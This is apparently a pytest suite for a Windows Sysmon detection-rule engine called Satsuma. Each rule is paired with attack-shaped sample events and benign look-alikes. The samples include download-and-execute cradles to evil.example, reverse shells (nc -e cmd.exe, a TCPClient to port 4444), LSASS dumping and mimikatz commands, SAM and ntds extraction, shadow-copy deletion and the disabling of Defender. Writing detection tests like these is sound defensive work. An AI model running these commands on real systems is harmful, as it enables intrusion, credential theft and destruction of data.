"""The Windows rule engine: the shared YAML language, Sysmon fields, stop decisions, Satsuma's own commands.

Windows kural motoru: ortak YAML dili, Sysmon alanları, durdurma kararları, Satsuma'nın kendi komutları.
"""
import re

import pytest
import yaml

from satsuma import enforcement
from satsuma.rule_schema import validate_rule
from satsuma_win import corpus, rules
from satsuma_win.rules import Engine, RuleError, compile_rule

PS = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
CMD = r'C:\Windows\System32\cmd.exe'
EXPLORER = r'C:\Windows\explorer.exe'


def proc(cmd, image=None, parent=EXPLORER, parent_cmd='explorer.exe', pid=4321):
    image = image or (cmd.split()[0].strip('"') if '\\' in cmd.split()[0] else r'C:\Windows\System32' + '\\' + cmd.split()[0])
    return {'id': 1, 'record': 1, 'ProcessId': str(pid), 'Image': image, 'CommandLine': cmd,
            'ParentImage': parent, 'ParentCommandLine': parent_cmd, 'ParentProcessId': '1000'}


def reg(target, details='', image=r'C:\Users\ali\AppData\Local\Temp\x.exe', kind='SetValue'):
    return {'id': 13 if kind == 'SetValue' else 12, 'record': 2, 'ProcessId': '4321', 'Image': image,
            'EventType': kind, 'TargetObject': target, 'Details': details}


def net(image, ip='203.0.113.5', port='443', host=''):
    return {'id': 3, 'record': 3, 'ProcessId': '4321', 'Image': image, 'Initiated': 'true',
            'DestinationIp': ip, 'DestinationPort': port, 'DestinationHostname': host}


def dns(image, query):
    return {'id': 22, 'record': 4, 'ProcessId': '4321', 'Image': image, 'QueryName': query, 'QueryResults': ''}


def file(path, image=r'C:\Users\ali\AppData\Local\Temp\x.exe'):
    return {'id': 11, 'record': 5, 'ProcessId': '4321', 'Image': image, 'TargetFilename': path}


def access(source, target=r'C:\Windows\System32\lsass.exe', rights='0x1fffff'):
    return {'id': 10, 'record': 6, 'SourceProcessId': '4321', 'SourceImage': source, 'TargetProcessId': '700',
            'TargetImage': target, 'GrantedAccess': rights}


B64 = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'
# Every bundled rule with at least one attack-shaped event it must catch.
# Her paketli kural ve yakalaması gereken en az bir saldırı biçimli olay.
POSITIVE = {
    'SATSUMA-WIN-001': [proc(PS + ' -NoP -W Hidden -enc ' + B64, PS)],
    'SATSUMA-WIN-002': [proc(PS + " -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\"", PS),
                        proc(PS + ' -c "iwr http://x/a.ps1 | iex"', PS)],
    'SATSUMA-WIN-003': [proc(PS + ' -ExecutionPolicy Bypass -WindowStyle Hidden -File a.ps1', PS)],
    'SATSUMA-WIN-004': [proc(r'C:\Windows\System32\mshta.exe http://evil.example/a.hta'),
                        proc('C:\\Windows\\System32\\mshta.exe "javascript:a=new ActiveXObject(\'WScript.Shell\')"')],
    'SATSUMA-WIN-005': [proc(r'C:\Windows\System32\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1)'),
                        proc(r'C:\Windows\System32\rundll32.exe \\10.0.0.5\share\evil.dll,Start')],
    'SATSUMA-WIN-006': [proc(r'C:\Windows\System32\regsvr32.exe /s /n /u /i:http://evil.example/a.sct scrobj.dll')],
    'SATSUMA-WIN-007': [proc(r'C:\Windows\System32\certutil.exe -urlcache -split -f http://evil.example/a.exe a.exe'),
                        proc(r'C:\Windows\System32\certutil.exe -decode payload.b64 payload.exe')],
    'SATSUMA-WIN-008': [proc(r'C:\Windows\System32\bitsadmin.exe /transfer job /download /priority high http://x/a.exe C:\a.exe')],
    'SATSUMA-WIN-009': [proc(PS + ' -c whoami', PS, parent=r'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE')],
    'SATSUMA-WIN-010': [proc(r'C:\Windows\System32\wscript.exe C:\Users\ali\AppData\Local\Temp\fatura.vbs')],
    'SATSUMA-WIN-011': [proc(r'C:\Windows\System32\mshta.exe C:\x.hta', parent=r'C:\Program Files\Google\Chrome\Application\chrome.exe')],
    'SATSUMA-WIN-012': [proc(r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\a.csproj')],
    'SATSUMA-WIN-013': [proc(CMD + ' /c curl -s http://x/a.exe -o %TEMP%\\a.exe & start %TEMP%\\a.exe', CMD,
                             parent=r'C:\Program Files\Google\Chrome\Application\chrome.exe')],
    'SATSUMA-WIN-020': [proc(PS + ' Set-MpPreference -DisableRealtimeMonitoring $true', PS)],
    'SATSUMA-WIN-021': [proc(PS + r' Add-MpPreference -ExclusionPath C:\Users\Public', PS)],
    'SATSUMA-WIN-022': [reg(r'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware', 'DWORD (0x00000001)')],
    'SATSUMA-WIN-023': [proc(r'C:\Windows\System32\wevtutil.exe cl Security'), proc(PS + ' Clear-EventLog -LogName System', PS)],
    'SATSUMA-WIN-024': [proc(r'C:\Windows\System32\netsh.exe advfirewall set allprofiles state off'),
                        proc(PS + ' Set-NetFirewallProfile -All -Enabled False', PS)],
    'SATSUMA-WIN-025': [reg(r'HKU\S-1-5-21-1-2-3-1001\Software\Classes\ms-settings\shell\open\command\(Default)', r'C:\Users\Public\a.exe')],
    'SATSUMA-WIN-026': [reg(r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger', CMD)],
    'SATSUMA-WIN-027': [proc(CMD + r' /c copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe', CMD)],
    'SATSUMA-WIN-028': [{'id': 25, 'record': 7, 'ProcessId': '4321', 'Image': r'C:\Windows\System32\svchost.exe', 'Type': 'Image is replaced'}],
    'SATSUMA-WIN-029': [{'id': 8, 'record': 8, 'SourceProcessId': '4321', 'SourceImage': r'C:\Users\ali\AppData\Local\Temp\inj.exe',
                         'TargetProcessId': '900', 'TargetImage': EXPLORER}],
    'SATSUMA-WIN-030': [{'id': 7, 'record': 9, 'ProcessId': '4321', 'Image': r'C:\Program Files\App\app.exe',
                         'ImageLoaded': r'C:\Users\ali\AppData\Local\Temp\x.dll', 'Signed': 'false', 'SignatureStatus': 'Unavailable'}],
    'SATSUMA-WIN-031': [proc(r'C:\Windows\System32\certutil.exe -addstore -f root C:\Users\Public\evil.cer'),
                        proc(PS + r' Import-Certificate -FilePath x.cer -CertStoreLocation Cert:\LocalMachine\Root', PS)],
    'SATSUMA-WIN-040': [reg(r'HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\Updater', r'C:\Users\ali\AppData\Local\Temp\upd.exe')],
    'SATSUMA-WIN-041': [reg(r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\x', 'powershell.exe -w hidden -enc ' + B64)],
    'SATSUMA-WIN-042': [reg(r'HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\Spotify', r'C:\Users\ali\AppData\Roaming\Spotify\Spotify.exe')],
    'SATSUMA-WIN-043': [file(r'C:\Users\ali\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\upd.vbs')],
    'SATSUMA-WIN-044': [proc(r'C:\Windows\System32\schtasks.exe /create /sc minute /tn upd /tr "powershell -w hidden -c iex"')],
    'SATSUMA-WIN-045': [reg(r'HKLM\System\CurrentControlSet\Services\evil\ImagePath', r'C:\Users\Public\svc.exe')],
    'SATSUMA-WIN-046': [proc(r'C:\Windows\System32\sc.exe create evil binPath= "C:\Users\Public\svc.exe"')],
    'SATSUMA-WIN-047': [proc(PS + " Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{}", PS)],
    'SATSUMA-WIN-048': [reg(r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit', r'C:\Windows\system32\userinit.exe,C:\Users\Public\x.exe')],
    'SATSUMA-WIN-049': [reg(r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs', r'C:\Users\Public\x.dll')],
    'SATSUMA-WIN-050': [reg(r'HKU\S-1-5-21-1_Classes\CLSID\{0358b920-0ac7-461f-98f4-58e32cd89148}\InprocServer32\(Default)', 'x.dll'),
                        reg(r'HKU\S-1-5-21-1\Software\Classes\CLSID\{0358b920-0ac7-461f-98f4-58e32cd89148}\InprocServer32\(Default)', 'x.dll')],
    'SATSUMA-WIN-051': [proc(r'C:\Windows\System32\net.exe user hacker P@ss123 /add'),
                        proc(r'C:\Windows\System32\net.exe localgroup administrators hacker /add')],
    'SATSUMA-WIN-060': [access(r'C:\Users\ali\AppData\Local\Temp\dump.exe')],
    'SATSUMA-WIN-061': [proc(r'C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 700 C:\x.dmp full')],
    'SATSUMA-WIN-062': [proc(r'C:\Tools\procdump64.exe -accepteula -ma lsass.exe C:\l.dmp', r'C:\Tools\procdump64.exe')],
    'SATSUMA-WIN-063': [proc(r'C:\Windows\System32\reg.exe save HKLM\SAM C:\Users\Public\sam')],
    'SATSUMA-WIN-064': [proc('C:\\Windows\\System32\\ntdsutil.exe "ac i ntds" "ifm" "create full C:\\x" q q')],
    'SATSUMA-WIN-065': [proc(r'C:\Users\ali\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit', r'C:\Users\ali\m.exe')],
    'SATSUMA-WIN-066': [reg(r'HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential', 'DWORD (0x00000001)')],
    'SATSUMA-WIN-067': [proc(CMD + r' /c copy "C:\Users\ali\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\x', CMD)],
    'SATSUMA-WIN-080': [proc(r'C:\Windows\System32\whoami.exe /priv'), proc(r'C:\Windows\System32\net.exe group "domain admins" /domain')],
    'SATSUMA-WIN-081': [proc(r'C:\Users\ali\SharpHound.exe -c All', r'C:\Users\ali\SharpHound.exe')],
    'SATSUMA-WIN-082': [proc(r'C:\Windows\System32\wbem\WMIC.exe /node:10.0.0.9 process call create "cmd /c calc"')],
    'SATSUMA-WIN-083': [proc(r'C:\Windows\PSEXESVC.exe', r'C:\Windows\PSEXESVC.exe')],
    'SATSUMA-WIN-084': [proc(CMD + ' /c whoami', CMD, parent=r'C:\Windows\System32\wbem\WmiPrvSE.exe')],
    'SATSUMA-WIN-085': [proc(r'C:\Windows\System32\reg.exe add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')],
    'SATSUMA-WIN-086': [reg(r'HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections', 'DWORD (0x00000000)')],
    'SATSUMA-WIN-100': [proc(r'C:\Users\ali\nc.exe 10.0.0.5 4444 -e cmd.exe', r'C:\Users\ali\nc.exe')],
    'SATSUMA-WIN-101': [proc(PS + " -c \"$c=New-Object System.Net.Sockets.TCPClient('10.0.0.5',4444);$s=$c.GetStream()\"", PS)],
    'SATSUMA-WIN-102': [proc(r'C:\Users\ali\ngrok.exe tcp 3389', r'C:\Users\ali\ngrok.exe'),
                        proc(r'C:\Users\ali\plink.exe -ssh -R 3389:127.0.0.1:3389 user@x', r'C:\Users\ali\plink.exe')],
    'SATSUMA-WIN-103': [net(r'C:\Windows\System32\mshta.exe')],
    'SATSUMA-WIN-104': [net(r'C:\Windows\System32\rundll32.exe')],
    'SATSUMA-WIN-105': [net(r'C:\Users\ali\x.exe', port='4444')],
    'SATSUMA-WIN-106': [dns(r'C:\Program Files\Google\Chrome\Application\chrome.exe', 'abc.ngrok-free.app')],
    'SATSUMA-WIN-107': [dns(PS, 'pastebin.com')],
    'SATSUMA-WIN-108': [proc(r'C:\Users\ali\AppData\Local\Temp\x.exe -o stratum+tcp://pool.example:3333 -u wallet', r'C:\Users\ali\AppData\Local\Temp\x.exe')],
    'SATSUMA-WIN-120': [proc(r'C:\Windows\System32\vssadmin.exe delete shadows /all /quiet'),
                        proc(r'C:\Windows\System32\wbem\WMIC.exe shadowcopy delete')],
    'SATSUMA-WIN-121': [proc(r'C:\Windows\System32\bcdedit.exe /set {default} recoveryenabled No')],
    'SATSUMA-WIN-122': [proc(r'C:\Windows\System32\cipher.exe /w:C:\\')],
    'SATSUMA-WIN-123': [proc(r'C:\Windows\System32\net.exe stop WinDefend'), proc(r'C:\Windows\System32\sc.exe config VSS start= disabled')],
    'SATSUMA-WIN-124': [file(r'C:\Users\ali\Documents\README_TO_DECRYPT.txt')],
    'SATSUMA-WIN-125': [proc(r'C:\Windows\System32\sc.exe stop SatsumaCore')],
}

# Look-alikes that must NOT match. Benzeyen ama eşleşmemesi gerekenler.
NEGATIVE = {
    'SATSUMA-WIN-001': [proc(PS + ' -ExecutionPolicy Bypass -File C:\\scripts\\yedek.ps1', PS)],
    'SATSUMA-WIN-007': [proc(r'C:\Windows\System32\certutil.exe -hashfile setup.exe SHA256')],
    'SATSUMA-WIN-013': [proc(CMD + ' /c curl -s http://x/a.exe -o a.exe', CMD,
                             parent=r'C:\Program Files\Google\Chrome\Application\chrome.exe'),
                        proc(CMD + ' /c curl http://x | more', CMD, parent=EXPLORER)],
    'SATSUMA-WIN-020': [proc(PS + ' Set-MpPreference -DisableRealtimeMonitoring $false', PS)],
    'SATSUMA-WIN-024': [proc(r'C:\Windows\System32\netsh.exe advfirewall set allprofiles state on')],
    'SATSUMA-WIN-040': [reg(r'HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\Spotify', r'C:\Users\ali\AppData\Roaming\Spotify\Spotify.exe')],
    'SATSUMA-WIN-048': [reg(r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit', 'C:\\Windows\\system32\\userinit.exe,'),
                        reg(r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell', 'explorer.exe')],
    'SATSUMA-WIN-060': [access(r'C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1-0\MsMpEng.exe'),
                        access(r'C:\Users\ali\x.exe', rights='0x1000')],
    'SATSUMA-WIN-086': [reg(r'HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections', 'DWORD (0x00000001)')],
    'SATSUMA-WIN-103': [net(r'C:\Program Files\Google\Chrome\Application\chrome.exe')],
    'SATSUMA-WIN-107': [dns(r'C:\Program Files\Google\Chrome\Application\chrome.exe', 'pastebin.com')],
    'SATSUMA-WIN-120': [proc(r'C:\Windows\System32\vssadmin.exe list shadows')],
    'SATSUMA-WIN-123': [proc(r'C:\Windows\System32\sc.exe query WinDefend')],
}


@pytest.fixture(scope='module')
def engine():
    return Engine(satsuma_exe=r'C:\Program Files\Satsuma\satsuma-core-windows.exe', own_pid=1)


def ids(engine, event):
    return {f['rule_id'] for f in engine.match(event)}


def test_every_bundled_rule_loads_with_the_shared_schema_and_has_a_positive_sample(engine):
    assert engine.load_errors == [] and len(engine.rules) >= 60
    for compiled in engine.rules:
        assert validate_rule(compiled['rule']) == []
    assert {c['rule']['id'] for c in engine.rules} == set(POSITIVE), 'every rule needs a sample, and only rules'


@pytest.mark.parametrize('rule_id', sorted(POSITIVE))
def test_each_rule_catches_its_attack(engine, rule_id):
    for event in POSITIVE[rule_id]:
        assert rule_id in ids(engine, event), event


@pytest.mark.parametrize('rule_id', sorted(NEGATIVE))
def test_each_rule_leaves_its_look_alike(engine, rule_id):
    for event in NEGATIVE[rule_id]:
        assert rule_id not in ids(engine, event), event


def test_no_stopping_rule_touches_everyday_windows_or_satsumas_own_commands(engine):
    lines = list(corpus.EVERYDAY) + corpus.satsuma_commands()
    assert len(corpus.satsuma_commands()) >= 15
    for line in lines:
        first = line.split('"')[1] if line.startswith('"') else line.split()[0]
        image = first if '\\' in first else r'C:\Windows\System32' + '\\' + first
        stopping = [f['rule_id'] for f in engine.match(proc(line, image)) if f['stop']]
        assert stopping == [], (line[:120], stopping)


def test_no_stopping_rule_touches_everyday_events_of_any_source(engine):
    for event in corpus.everyday_events():
        stopping = [f['rule_id'] for f in engine.match(event) if f['stop']]
        assert stopping == [], (event, stopping)


def test_the_stop_is_the_shared_linux_decision(engine):
    suspicious = engine.match(POSITIVE['SATSUMA-WIN-120'][0])[0]
    indicator = engine.match(POSITIVE['SATSUMA-WIN-080'][0])[0]
    assert suspicious['stop'] is True and enforcement.eligible(suspicious)
    assert indicator['stop'] is False and indicator['classification'] == 'indicator'


def test_satsuma_and_what_it_starts_are_not_matched(engine):
    event = proc(r'C:\Windows\System32\sc.exe stop WinDefend', parent=r'C:\Program Files\Satsuma\satsuma-core-windows.exe')
    assert engine.match(event) == []
    own = {**POSITIVE['SATSUMA-WIN-120'][0], 'ParentProcessId': '1'}
    assert engine.match(own) == []


def test_bundled_regexes_run_in_bounded_time_on_long_input(engine):
    """No bundled pattern may hang the service: 8 KiB of hostile text, a hard time per pattern."""
    import time
    hostile = ['a' * 9000, ('\\x' * 4500), (' -e ' * 2300), ('powershell ' * 900), ('C:\\Users\\' * 1000) + '!']
    for compiled in engine.rules:
        for field, kind, values in compiled['checks']:
            if not kind.endswith(('regex', 'regex_cs')):
                continue
            for pattern in values:
                for text in hostile:
                    started = time.perf_counter()
                    pattern.search(rules._text(text))
                    assert time.perf_counter() - started < 0.05, (compiled['rule']['id'], pattern.pattern)


def test_an_invalid_rule_is_reported_never_silently_ignored(tmp_path):
    good = yaml.safe_load(open(rules.rules_dir() / 'impact.yaml', encoding='utf-8'))[0]
    bad = [{**good, 'id': 'SATSUMA-WIN-900', 'base_match': {'source': 'sys_proc', 'cmd_regex': ['x']}},
           {**good, 'id': 'SATSUMA-WIN-901', 'base_match': {'source': 'win_dns', 'cmd_regex': ['x']}},
           {**good, 'id': 'SATSUMA-WIN-902', 'base_match': {'source': 'win_proc', 'uid': [0]}},
           {**good, 'id': 'SATSUMA-WIN-903', 'base_match': {'source': 'win_registry', 'operation': ['SetValue']}},
           {**good, 'id': 'SATSUMA-WIN-904', 'base_match': {'source': 'win_proc', 'cmd_regex': ['(']}}]
    (tmp_path / 'bad.yaml').write_text(yaml.safe_dump([good] + bad, allow_unicode=True), encoding='utf-8')
    engine = Engine(tmp_path)
    assert [c['rule']['id'] for c in engine.rules] == [good['id']]
    errors = ' | '.join(e['error'] for e in engine.load_errors)
    for needle in ('not a Windows source', 'has no cmd field', 'uid', 'positive matcher', 'invalid cmd_regex'):
        assert needle in errors, (needle, errors)
    with pytest.raises(RuleError):
        compile_rule({**good, 'base_match': {'source': 'win_proc'}})


def test_the_linux_engine_never_sees_the_windows_rules():
    from pathlib import Path
    repo = Path(rules.__file__).resolve().parents[2]
    assert not (repo / 'rules' / 'windows').exists()
    assert rules.rules_dir().resolve() != (repo / 'rules').resolve()


def test_a_glob_crosses_folders_and_ignores_case():
    pattern = rules._glob(r'*\Start Menu\Programs\Startup\*.vbs')
    assert pattern.match(r'c:\users\ali\appdata\roaming\microsoft\windows\start menu\programs\startup\x.VBS')
    assert not pattern.match(r'C:\Users\ali\Desktop\x.vbs')
    assert re.compile(r'\\(powershell|pwsh)\.exe$', re.I).search(PS)
